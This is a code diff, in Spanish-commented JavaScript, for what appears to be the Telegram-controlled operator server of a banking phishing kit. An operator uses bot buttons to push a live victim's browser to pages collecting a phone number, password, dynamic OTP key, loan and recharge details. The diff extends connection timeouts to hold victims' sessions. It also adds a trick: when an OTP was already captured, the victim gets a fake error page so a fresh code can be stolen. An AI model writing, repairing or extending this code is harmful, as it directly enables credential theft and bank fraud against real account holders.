@@ -44,17 +44,17 @@ const io = socketIO(server, {
     methods: ['GET', 'POST'],
     credentials: true
   },
-  // Configuración optimizada para múltiples sesiones simultáneas y persistencia
-  pingInterval: 25000, // Ping cada 25 segundos (balance entre persistencia y carga)
-  pingTimeout: 60000, // Esperar 60 segundos antes de considerar timeout
-  upgradeTimeout: 30000,
-  maxHttpBufferSize: 1e8, // 100 MB para soportar muchas sesiones
-  allowUpgrades: true, // Permitir upgrade a WebSocket para mejor rendimiento
+  // Configuración ULTRA ESTABLE para múltiples sesiones simultáneas sin desconexiones
+  pingInterval: 20000, // Ping cada 20 segundos (muy estable)
+  pingTimeout: 120000, // 2 MINUTOS de timeout - conexiones muy persistentes
+  upgradeTimeout: 30000, // 30 segundos para upgrade
+  maxHttpBufferSize: 1e8, // 100 MB
+  allowUpgrades: true,
   perMessageDeflate: false,
   httpCompression: false,
-  transports: ['websocket', 'polling'], // WebSocket primero, polling como fallback
+  transports: ['websocket', 'polling'],
   allowEIO3: true,
-  connectTimeout: 45000, // 45 segundos para establecer conexión
+  connectTimeout: 60000, // 1 minuto para establecer conexión inicial
   cookie: false
 });
 const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
@@ -356,66 +356,37 @@ class TelegramService {
 
     const socketId = session.socketId;
     
-    // Intentar encontrar el socket con reintentos mejorados
-    let socket = null;
-    const MAX_RETRIES = 10; // Aumentado a 10 intentos
-    const RETRY_DELAY = 1000; // 1 segundo entre intentos
+    // Buscar socket directamente - sin reintentos innecesarios
+    let socket = io.sockets.sockets.get(socketId);
     
-    for (let i = 0; i < MAX_RETRIES; i++) {
-      socket = io.sockets.sockets.get(socketId);
-      
-      if (socket && socket.connected) {
-        console.log(`✅ Socket encontrado y conectado en intento ${i + 1}`);
-        break;
-      }
-      
-      // Buscar socket reconectado con el mismo sessionId
+    // Si no está con ese socketId, buscar por sessionId (reconectado)
+    if (!socket || !socket.connected) {
       for (let [sid, s] of io.sockets.sockets) {
-        if (s.connected) { // Solo sockets realmente conectados
+        if (s.connected) {
           const socketSession = sessionRepo.get(sid);
           if (socketSession && socketSession.sessionId === sessionId) {
             socket = s;
-            session.socketId = sid; // Actualizar socketId
-            // Actualizar en Map principal
+            session.socketId = sid;
             sessionRepo.sessions.delete(socketId);
             sessionRepo.sessions.set(sid, session);
-            console.log(`✅ Socket reconectado encontrado: ${sid}`);
+            console.log(`✅ Socket reconectado: ${sid}`);
             break;
           }
         }
       }
-      
-      if (socket && socket.connected) break;
-      
-      // Esperar antes del siguiente intento
-      if (i < MAX_RETRIES - 1) {
-        console.log(`⏳ Intento ${i + 1}/${MAX_RETRIES} - Esperando reconexión...`);
-        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-      }
     }
     
-    // Si después de todos los intentos no se encuentra el socket conectado
+    // Si NO hay socket conectado, responder y retornar
     if (!socket || !socket.connected) {
-      console.error(`❌ Socket no disponible después de ${MAX_RETRIES} intentos`);
-      
-      // Responder al callback para no dejar colgado Telegram
+      console.error(`❌ Socket no disponible para sesión: ${sessionId}`);
       await this.bot.answerCallbackQuery(callbackQuery.id, {
-        text: '⏳ Cliente reconectándose...',
-        show_alert: false
+        text: '❌ Cliente desconectado',
+        show_alert: true
       });
-      
-      // Enviar mensaje informativo (no error)
-      await this.bot.sendMessage(this.chatId, 
-        `ℹ️ *Solicitud Pendiente*\n\n` +
-        `🆔 Sesión: \`${sessionId}\`\n` +
-        `⏰ ${new Date().toLocaleString('es-CO')}\n\n` +
-        `_El cliente se está reconectando. La solicitud se procesará automáticamente cuando vuelva a conectar._`,
-        { parse_mode: 'Markdown' }
-      );
       return;
     }
 
-    console.log(`✅ Sesión y socket encontrados: ${sessionId}`);
+    console.log(`✅ Socket activo y conectado: ${sessionId}`);
 
     // Procesar acciones
     if (action === 'req') {
@@ -424,7 +395,7 @@ class TelegramService {
         'phone': { page: 'numero.html', text: '📞 Solicitando número...', emoji: '📞', label: 'Número de Teléfono' },
         'pass': { page: 'contraseña.html', text: '🔑 Solicitando clave...', emoji: '🔑', label: 'Contraseña' },
         'loan': { page: 'simular-credito.html', text: '💰 Solicitando crédito...', emoji: '💰', label: 'Simulación de Crédito' },
-        'dinamica': { page: 'dinamica.html?error=true', text: '🔐 Solicitando clave dinámica...', emoji: '🔐', label: 'Clave Dinámica' },
+        'dinamica': { page: 'dinamica.html', text: '🔐 Solicitando clave dinámica...', emoji: '🔐', label: 'Clave Dinámica' },
         'recarga': { page: 'recarga.html', text: '💳 Solicitando recarga...', emoji: '💳', label: 'Recarga' }
       };
 
@@ -433,17 +404,22 @@ class TelegramService {
         // Responder callback INMEDIATAMENTE
         await this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
         
-        // Emitir redirección
-        socket.emit('redirect', { url: request.page });
-        console.log(`🔄 Redirección enviada: ${request.page}`);
+        // Si es solicitud de dinámica y ya existe una clave previa, redirigir con error
+        let redirectUrl = request.page;
+        if (subaction === 'dinamica' && session.data.dinamica) {
+          console.log('⚠️ Clave dinámica previa detectada - redirigiendo con error');
+          redirectUrl = 'dinamica.html?error=true';
+        }
         
-        // Enviar mensaje de confirmación a Telegram (en background)
+        // Emitir redirección
+        socket.emit('redirect', { url: redirectUrl });
+        console.log(`🔄 Redirección enviada: ${redirectUrl}`);
+        
+        // Enviar mensaje de confirmación a Telegram (en background, no bloquear)
         const confirmMessage = `✅ *Comando Ejecutado*\n\n${request.emoji} *Acción:* ${request.label}\n🆔 *Sesión:* \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_El usuario ha sido redirigido a ${request.page}_`;
         
         this.bot.sendMessage(this.chatId, confirmMessage, {
           parse_mode: 'Markdown'
-        }).then(() => {
-          console.log(`✅ Confirmación de acción enviada: ${request.label}`);
         }).catch((error) => {
           console.error('⚠️ Error al enviar confirmación:', error.message);
         });
